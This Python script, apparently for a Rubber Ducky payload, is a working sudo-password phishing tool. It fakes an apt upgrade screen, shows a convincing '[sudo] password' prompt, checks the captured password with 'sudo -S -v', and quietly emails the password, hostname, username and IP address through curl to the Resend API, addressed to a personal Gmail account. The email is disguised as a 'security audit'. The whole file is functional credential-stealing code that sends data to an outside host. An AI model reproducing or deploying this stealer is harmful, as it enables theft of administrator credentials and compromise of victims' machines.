import os
import sys
import time
import getpass
import subprocess
import threading
import random
from datetime import datetime

# Global DEBUG variable
DEBUG = False  # Force DEBUG mode for testing

def debug_log(message):
    if DEBUG:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[DEBUG {timestamp}] {message}")

def clear_screen():
    if not DEBUG:
        os.system('clear')
    else:
        debug_log("Screen clear skipped in DEBUG mode")

def print_with_delay(text, delay=0.05):
    if DEBUG:
        print(text)  # Print instantly in debug mode
        debug_log(f"Printed: {text}")
    else:
        for char in text:
            print(char, end='', flush=True)
            time.sleep(delay)
        print()

def send_password_via_resend(password):
    debug_log(f"Starting email send process for password: {password}")
    try:
        # When flashing the rubberducky it should have the Resend API key command set since I cant push my actual key to github
        api_key = os.environ.get("RESEND_API_KEY")
        if not api_key:
            debug_log("RESEND_API_KEY environment variable not found")
            return
        debug_log(f"API Key present: {bool(api_key)}")
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hostname = os.uname().nodename
        username = os.environ.get('USER', 'unknown')
        try:
            ip_address = subprocess.check_output(
            ["hostname", "-I"], text=True
            ).strip().split()[0]
        except Exception:
            ip_address = "unknown"

        debug_log(f"Email details - Hostname: {hostname}, User: {username}, IP: {ip_address}")

        subject = f"Security Audit - Credential Capture from {hostname}"
        html_body = f"""
        <h2>Stolen Sudo Password</h2>
        <hr>
        <p><strong>Timestamp:</strong> {timestamp}</p>
        <p><strong>Target System:</strong> {hostname}</p>
        <p><strong>Username:</strong> {username}</p>
        <p><strong>IP Address:</strong> {ip_address}</p>
        <p><strong>Captured Password:</strong> {password}</p>
        <br>
        <p>This is an automated security audit report.<br>
        Please review system security protocols.</p>
        <hr>
        <p>--<br>Automated Security Audit System</p>
        """

        data = {
            "from": "Acme <onboarding@resend.dev>",
            "to": ["arkhamzz47@gmail.com"],
            "subject": subject,
            "html": html_body
        }

        curl_cmd = [
            "curl", "-X", "POST", "https://api.resend.com/emails",
            "-H", f"Authorization: Bearer {api_key}",
            "-H", "Content-Type: application/json",
            "-d", str(data).replace("'", '"')
        ]
        
        debug_log(f"Executing curl command: {' '.join(curl_cmd[:3])}...")
        
        if DEBUG:
            # In debug mode, capture the output and status
            process = subprocess.Popen(curl_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            debug_log(f"Curl exit code: {process.returncode}")
            debug_log(f"Curl stdout: {stdout}")
            if stderr:
                debug_log(f"Curl stderr: {stderr}")
        else:
            subprocess.Popen(curl_cmd)
            
        debug_log("Email sending process initiated successfully")
        
    except Exception as e:
        debug_log(f"Error sending email: {str(e)}")

def show_system_info():
    """Display system information"""
    debug_log("Showing system info")
    clear_screen()
    print("Reading package lists...")
    if not DEBUG:
        time.sleep(1)

def show_update_check():
    """Display update checking process"""
    debug_log("Showing update check")
    print("Building dependency tree...")
    print("Reading state information...")
    if not DEBUG:
        time.sleep(2)
    
    print("The following packages will be upgraded:")
    print("  ca-certificates libssl3 linux-firmware openssl systemd")
    print("5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.")
    print("Need to get 14.2 MB of archives.")
    print("After this operation, 0 B of additional disk space will be used.")
    print()
    if not DEBUG:
        time.sleep(1)

def capture_sudo_password():
    """Capture sudo password with realistic prompt and verification using background sudo check"""
    debug_log("Starting password capture process")
    max_attempts = 3
    attempt = 1

    while attempt <= max_attempts:
        try:
            # Use getpass for hidden password input
            if attempt == 1:
                prompt = "[sudo] password for {}: ".format(os.getenv('USER', 'user'))
            else:
                prompt = "Sorry, try again.\n[sudo] password for {}: ".format(os.getenv('USER', 'user'))

            debug_log(f"Password attempt {attempt}/{max_attempts}")
            password = getpass.getpass(prompt)
            debug_log(f"Password captured: {password}")

            # Actually call sudo -S in the background to verify
            debug_log("Verifying password with sudo")
            process = subprocess.Popen(
                ['sudo', '-S', '-v'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(input=password + '\n', timeout=10)

            debug_log(f"Sudo verification - Return code: {process.returncode}")
            debug_log(f"Sudo stdout: {stdout}")
            debug_log(f"Sudo stderr: {stderr}")

            if process.returncode == 0:
                debug_log("Password verification successful!")
                return password
            else:
                debug_log("Password verification failed")
                attempt += 1

        except KeyboardInterrupt:
            debug_log("Process interrupted by user")
            print("\n")
            sys.exit(1)
        except subprocess.TimeoutExpired:
            debug_log("Sudo verification timeout")
            attempt += 1

    # If all attempts failed
    debug_log("All password attempts failed")
    print(f"sudo: {max_attempts} incorrect password attempts")
    sys.exit(1)

def show_installation_progress():
    """Display package installation progress"""
    debug_log("Starting fake installation progress")
    
    downloads = [
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libssl3 amd64 3.0.2-0ubuntu1.15", "1,898 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 openssl amd64 3.0.2-0ubuntu1.15", "1,185 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 linux-firmware all 20220329.git681281e4-0ubuntu3.21", "9,775 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ca-certificates all 20230311ubuntu0.22.04.1", "153 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 systemd amd64 249.11-0ubuntu3.12", "4,526 kB")
    ]
    
    for i, (url, size) in enumerate(downloads, 1):
        print(f"Get:{i} {url} [{size}]")
        sleep_time = random.uniform(0.5, 1.0) if not DEBUG else 0.1
        time.sleep(sleep_time)
        debug_log(f"Downloaded package {i}/5")
    
    print("Fetched 14.2 MB in 3s (4,237 kB/s)")
    print("(Reading database ... 185243 files and directories currently installed.)")
    
    packages = [
        "libssl3:amd64",
        "openssl", 
        "linux-firmware",
        "ca-certificates",
        "systemd"
    ]
    
    for package in packages:
        print(f"Preparing to unpack .../archives/{package}...")
        time.sleep(random.uniform(0.2, 0.5) if not DEBUG else 0.05)
        print(f"Unpacking {package} ...")
        time.sleep(random.uniform(0.3, 0.8) if not DEBUG else 0.05)
        print(f"Setting up {package} ...")
        time.sleep(random.uniform(0.5, 1.0) if not DEBUG else 0.05)
        debug_log(f"Processed package: {package}")
    
    debug_log("Installation progress completed")

def show_completion_message():
    """Display completion message"""
    debug_log("Showing completion message")
    print("Processing triggers for man-db (2.10.2-1) ...")
    print("Processing triggers for libc-bin (2.35-0ubuntu3.4) ...")
    if not DEBUG:
        time.sleep(1)
    print()
    debug_log("Completion message shown")

def main():
    """Main execution function"""
    debug_log("=== FAKESUDO SCRIPT STARTED ===")
    debug_log(f"DEBUG mode: {DEBUG}")
    
    try:
        show_system_info()
        
        show_update_check()
        
        password = capture_sudo_password()
        debug_log(f"Successfully captured password: {password}")
        
        if password:
            debug_log("Starting background email thread")
            background_thread = threading.Thread(target=send_password_via_resend, args=(password,))
            background_thread.daemon = True
            background_thread.start()
        
        # Show installation progress (this now runs after successful password)
        show_installation_progress()
        
        show_completion_message()
        
        debug_log("=== FAKESUDO SCRIPT COMPLETED SUCCESSFULLY ===")
        sys.exit(0)
        
    except KeyboardInterrupt:
        debug_log("Script interrupted by user")
        print("\n")
        sys.exit(1)
    except Exception as e:
        debug_log(f"Script error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
